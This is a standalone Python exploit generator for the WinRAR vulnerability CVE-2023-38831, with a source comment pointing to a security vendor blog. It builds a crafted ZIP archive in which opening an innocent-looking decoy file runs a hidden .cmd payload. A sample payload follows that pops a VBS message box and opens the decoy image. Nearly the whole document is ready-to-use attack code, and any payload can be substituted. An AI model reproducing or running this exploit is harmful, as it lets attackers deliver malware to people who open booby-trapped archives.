# Souce: https://www.uptycs.com/blog/winrar-vulnerability-exploitation

# Exploit Script:

import shutil
import os
import sys
from os.path import join


def generate_exploit(folder_name, decoy_filename, payload_filename, output_filename):  
  
    decoy_ext = os.path.splitext(decoy_filename)[1].encode("utf-8")
    if os.path.exists(folder_name):
        shutil.rmtree(folder_name)
    os.mkdir(folder_name)
    sub_dir = join(folder_name, decoy_filename + "1")
  
    if not os.path.exists(sub_dir):
        os.mkdir(sub_dir)
    shutil.copyfile(join(payload_filename), join(sub_dir, decoy_filename+"1.cmd"))
    shutil.copyfile(join(decoy_filename), join(folder_name, decoy_filename+"2"))
    shutil.make_archive(folder_name, 'zip', folder_name)

    with open(folder_name + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(decoy_ext + b"1", decoy_ext + b" ")
        content = content.replace(decoy_ext + b"2", decoy_ext + b" ")
    os.remove(folder_name + ".zip")

    with open(output_filename, "wb")  as f:
        f.write(content)
    print("Exploit generated successfully:", output_filename)

def main():
    if len(sys.argv) < 4:
        print("""Usage:
              python .\exploit.py <decoy_filename> <payload_filename> <output_filename>""")
    else:
        if len(sys.argv) != 4:
            print("Invalid number of parameters.")
        else:
            folder_name = "Malicious_file"
            decoy_filename = os.path.basename(sys.argv[1])
            payload_filename = os.path.basename(sys.argv[2])
            output_filename = os.path.basename(sys.argv[3])
            generate_exploit(folder_name, decoy_filename, payload_filename, output_filename)

if __name__ == "__main__":
    main()

# Payload script:

echo x=msgbox("        Exploited the CVE-2023-38831        " ,0, "WinRAR") >> msgbox.vbs &
start msgbox.vbs &
image.jpg
